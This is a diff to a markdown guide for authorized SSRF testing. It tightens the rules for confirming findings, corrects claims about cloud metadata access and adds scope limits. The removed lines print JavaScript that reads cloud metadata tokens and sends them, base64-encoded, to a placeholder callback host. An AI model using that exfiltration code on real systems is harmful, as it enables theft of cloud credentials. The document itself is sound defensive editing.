@@ -58,7 +58,7 @@ OOB means: a Burp Collaborator domain, an `interactsh-client` listener, a canary
 
 ### What IS confirmation of SSRF
 
-- A DNS lookup for your unique Collaborator subdomain appears in the OOB listener.
+- A unique DNS lookup confirms resolution only; attribute it to the target rather than a scanner/resolver, and do not claim an HTTP fetch from DNS alone.
 - An HTTP request to your Collaborator HTTP endpoint with the server's source IP and User-Agent.
 - For SSRF in JavaScript-execution contexts (PDF renderers, headless browsers), a fetch from the server to your callback URL.
 
@@ -74,7 +74,7 @@ OOB means: a Burp Collaborator domain, an `interactsh-client` listener, a canary
 2. **Send the request** to the target endpoint.
 3. **Wait 30–120 seconds**, then poll the OOB listener.
 4. **Only after a confirmed callback** do you claim SSRF.
-5. If zero callbacks across all sub-tagged sinks: SSRF claims must be retracted, even if error messages echo URLs.
+5. If no callbacks arrive, report this attempt as unconfirmed; egress filtering, asynchronous work or listener failure can produce false negatives. URL reflection alone remains insufficient.
 
 **Lesson from a authorized engagement:** SharePoint's `/_layouts/15/download.aspx?SourceUrl=` returned 500 with the title `"The Web application at <attacker-URL> could not be found"`. Initial scan flagged this as SSRF (server clearly processed the URL). 38 Collaborator-tagged payloads across 12+ URL-accepting parameters yielded **zero DNS or HTTP interactions**. The "echo" was client-side error-string formatting; the server never made an outbound HTTP request. The path is actually an SP-internal `SPFile`/`SPWebApplication` resolver, not a generic URL fetcher. Reporting this as SSRF would have been N/A'd at triage.
 
@@ -111,8 +111,7 @@ the client to patch a field that does nothing.
 After a callback confirms the request leaves the server, **check whether the
 upstream response body is returned to you.** These are different findings:
 
-- **Blind** (callback only, no body): on the never-submit list standalone. Needs an
-  internal service reached, or data returned, to be reportable.
+- **Blind** (callback only, no body): assess according to the program policy and concrete reachable impact; no universal never-submit rule applies.
 - **Full-read** (upstream body in the response): substantially higher severity —
   read arbitrary internal endpoints directly.
 
@@ -125,8 +124,7 @@ upstream response body is returned to you.** These are different findings:
 
 Also body-diff a known-internal target against a known-external one. A **distinct
 status** on a link-local address (e.g. `401` from `169.254.169.254` where every
-other target returns `200`) is the metadata service answering — that proves reach
-to a non-internet-routable address, which a status code alone otherwise cannot.
+other target returns `200`) could be a validator, proxy or upstream service response. Status differences alone do not identify metadata or prove internal reachability.
 
 
 ---
@@ -308,24 +306,9 @@ class Redirect(BaseHTTPRequestHandler):
 HTTPServer(('0.0.0.0', 8080), Redirect).serve_forever()
 ```
 
-### JavaScript-Based SSRF (headless browser contexts)
-```javascript
-// Exfil via fetch
-fetch('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', {
-  headers: {'Metadata-Flavor': 'Google'}
-}).then(r=>r.text()).then(d=>{
-  fetch('https://YOUR.callback.com/?d='+btoa(d))
-})
+### Headless-renderer validation
 
-// DNS exfil for blind contexts
-var x = new XMLHttpRequest();
-x.open('GET','http://169.254.169.254/latest/meta-data/');
-x.send();
-x.onload = function(){
-  var img = new Image();
-  img.src = 'https://'+btoa(x.responseText.substring(0,50))+'.YOUR.callback.com';
-}
-```
+Use a unique harmless callback to an owned receiver and a separate synthetic internal canary only when explicitly in scope. Browser same-origin/CORS/private-network restrictions may prevent reading internal responses even when a request is sent. Do not fetch or encode real metadata tokens, user data or secrets into callback URLs/DNS labels.
 
 ### Grep Patterns for Source Code Review
 ```bash
@@ -362,7 +345,7 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
 
 6. **Internal hostname leakage via response differences** — Services return different error messages, timing, or response sizes for internal vs. external hosts, enabling blind enumeration even when content isn't returned.
 
-7. **IMDSv1 still enabled** — Cloud deployments that haven't migrated to IMDSv2 (AWS) or haven't required the `Metadata-Flavor` header (GCP) allow unauthenticated credential access from any SSRF.
+7. **Metadata reachability** — AWS IMDSv2 requires a session-token exchange; GCP normally requires `Metadata-Flavor: Google`. URL-only SSRF does not automatically satisfy these constraints or imply credential access.
 
 ---
 
@@ -381,6 +364,8 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
 - You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.
 
 ## Limitations
+
+- Restrict callbacks to an approved owned receiver; do not send credentials or personal data to OOB services. Internal scanning, cloud metadata, file schemes and protocol-changing tests require explicit scope and minimal synthetic proof. URL parser, redirect, TLS, header and browser restrictions vary by implementation; payload lists are hypotheses, not guaranteed bypasses.
 
 - Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
 - Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
